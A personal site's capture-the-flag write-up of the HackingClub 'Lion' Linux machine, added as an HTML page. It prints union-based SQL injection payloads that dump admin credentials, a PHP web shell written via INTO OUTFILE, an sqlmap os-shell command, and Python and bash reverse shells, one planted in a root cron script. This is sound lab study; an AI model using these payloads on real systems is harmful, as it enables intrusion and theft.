@@ -1,0 +1,124 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>[HC] Lion - ribeir.in</title>
+    <link rel="stylesheet" href="../../css/style.css">
+</head>
+<body>
+    <div class="container">
+        <div data-component="header" data-base-path="../../"></div>
+
+        <main>
+            <article class="content">
+                <h1>[HackingClub] Lion Writeup</h1>
+                
+                <div class="box-info">
+                    <table>
+                        <tr>
+                            <td>Platform:</td>
+                            <td>HackingClub</td>
+                        </tr>
+                        <tr>
+                            <td>Machine:</td>
+                            <td>Lion</td>
+                        </tr>
+                        <tr>
+                            <td>Category:</td>
+                            <td>Web Exploitation</td>
+                        </tr>
+                        <tr>
+                            <td>OS:</td>
+                            <td>Linux</td>
+                        </tr>
+                        <tr>
+                            <td>Difficulty:</td>
+                            <td><span class="difficulty easy">Easy</span></td>
+                        </tr>
+                    </table>
+                </div>
+
+                <div class="tags" style="margin-bottom: 30px;">
+                    <span class="tag">sql-injection</span>
+                    <span class="tag">cron</span>
+                </div>
+
+                <img src="../../images/hackingclub/lion/index.webp" alt="Lion Machine" style="max-width: 100%; margin-bottom: 20px;">
+
+                <h2>## Recon</h2>
+                
+                <p>During the recon phase using Nmap and Feroxbuster, we found a few interesting things, such as an endpoint <code>/admine/includes</code> that contains some information, but we didn't find anything suspicious. The Nmap scan didn't reveal anything unusual either.</p>
+                <img src="../../images/hackingclub/lion/nmap.webp" alt="Nmap" style="max-width: 100%; margin: 20px 0;">
+                <img src="../../images/hackingclub/lion/feroxbuster.webp" alt="Feroxbuster" style="max-width: 100%; margin: 20px 0;">
+
+                <p>Looking at the <code>/index.php</code> directory, we notice a search field that sends a POST request to <code>search.php</code> (the parameter used is <code>searchtitle</code>, as seen in the form). By attempting an SQL injection query, we can retrieve the first flag.</p>
+                <img src="../../images/hackingclub/lion/search.webp" alt="Search" style="max-width: 100%; margin: 20px 0;">
+
+                <h2>## Exploitation</h2>
+                
+                <p>This is an SQLi vulnerability. For manual exploitation, we'll first attempt to determine the number of columns using the following query: <code>' order by 7 #</code></p>
+
+                <p>After the <code>ORDER BY 8</code>, we get no results, so there are 7 columns. This indicates a union-based SQL injection. To retrieve some information, we will run the following queries:</p>
+
+                <ul>
+                    <li>Query to retrieve the current database name: <code>' union select 1,database(),3,4,5,6,7 #</code>. The database name is: <strong>news</strong>.</li>
+                    <li>Query to retrieve tables: <code>' union select 1,table_name,3,4,5,6,7 from information_schema.tables where table_schema = 'news' #</code>. Tables: <code>tbladmin</code>, <code>tblcategory</code>, <code>tblcomments</code>, <code>tblpages</code>, <code>tblposts</code>, <code>tblsubcategory</code>.</li>
+                    <li>Get columns: <code>' union select 1,column_name,3,4,5,6,7 from information_schema.columns where table_name = 'tbladmin' #</code>. Columns: <code>AdminUserName</code> and <code>AdminPassword</code>.</li>
+                    <li>Retrieve results: <code>' union select 1,AdminUserName,3,4,5,6,7 from tbladmin; #</code> and <code>' union select 1,AdminPassword,3,4,5,6,7 from tbladmin; #</code>.</li>
+                </ul>
+
+                <p>We have the following user/password: <code>admin:$2y$12$hu9MjecXIjTfVg8VW8hTtOb8EWdd3muA773vZa7r5m0QepC9PJ4b</code>. I ran it through Hash Identifier, and it's bcrypt. I tried cracking it with Hashcat, but it didn't work.</p>
+
+                <p>So, let's attempt to place a shell in the <code>includes</code> directory instead:</p>
+                <pre><code>' union select 1,&lt;?php system($_GET['cmd']);?&gt;,3,4,5,6,7 into outfile "/var/www/html/includes/x.php #</code></pre>
+                <img src="../../images/hackingclub/lion/shell1.webp" alt="Shell 1" style="max-width: 100%; margin: 20px 0;">
+
+                <p>Alright, we have a PHP shell. Using SQLMap, we can also use the <code>--os-shell</code> parameter:</p>
+
+                <pre><code>python3 sqlmap.py -u "http://172.16.14.214/search.php" --data "searchtitle=teste" --os-shell</code></pre>
+
+                <img src="../../images/hackingclub/lion/sqlmap1.webp" alt="SQLMap 1" style="max-width: 100%; margin: 20px 0;">
+                <img src="../../images/hackingclub/lion/shell2.webp" alt="Shell 2" style="max-width: 100%; margin: 20px 0;">
+                <img src="../../images/hackingclub/lion/shell3.webp" alt="Shell 3" style="max-width: 100%; margin: 20px 0;">
+                <img src="../../images/hackingclub/lion/shell4.webp" alt="Shell 4" style="max-width: 100%; margin: 20px 0;">
+
+                <p>Now, we can get reverse shell with python:</p>
+                <pre><code>export RHOST="IP";export RPORT=PORTA;python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("sh")'</code></pre>
+
+                <h2>## Post Exploitation</h2>
+                
+                <p>I ran <code>linpeas</code> to find potential vectors for privilege escalation. We found a <code>.sh</code> file (with misconfigured permissions) that is set to run as root in a cron job.</p>
+                <img src="../../images/hackingclub/lion/pos1.webp" alt="Post 1" style="max-width: 100%; margin: 20px 0;">
+                <img src="../../images/hackingclub/lion/pos2.webp" alt="Post 2" style="max-width: 100%; margin: 20px 0;">
+                <img src="../../images/hackingclub/lion/pos3.webp" alt="Post 3" style="max-width: 100%; margin: 20px 0;">
+
+                <p>There appears to be a logrotate version 3.8.6, which may be vulnerable. If our attempt with the cron job doesn't work, we can try exploiting the logrotate vulnerability as an alternative.</p>
+                <img src="../../images/hackingclub/lion/pos4.webp" alt="Post 4" style="max-width: 100%; margin: 20px 0;">
+
+                <p>Going back to the cron job, since we have write permissions on the file, we can modify it and apply the payload. After making the changes, we just need to wait for the cron job to execute and gain privilege escalation.</p>
+
+                <pre><code>/bin/bash -c 'sh -i &gt;&amp; /dev/tcp/ip/porta 0&gt;&amp;1'</code></pre>
+
+                <img src="../../images/hackingclub/lion/pos5.webp" alt="Post 5" style="max-width: 100%; margin: 20px 0;">
+                <img src="../../images/hackingclub/lion/pos6.webp" alt="Post 6" style="max-width: 100%; margin: 20px 0;">
+
+                <div class="article-eof">
+                    <div class="eof-line">─────────────────────────────────────</div>
+                    <div class="eof-title">HackingClub // Lion</div>
+                    <div class="eof-author">ribeir.in</div>
+                    <div class="eof-line">─────────────────────────────────────</div>
+                </div>
+            </article>
+
+            <div style="margin-top: 30px; padding-top: 20px; border-top: 1px dashed var(--text-dim);">
+                <a href="../../writeups.html">&lt;&lt; Back to Writeups</a>
+            </div>
+        </main>
+
+        <div data-component="footer" data-base-path="../../"></div>
+    </div>
+
+    <script src="../../js/main.js"></script>
+</body>
+</html>
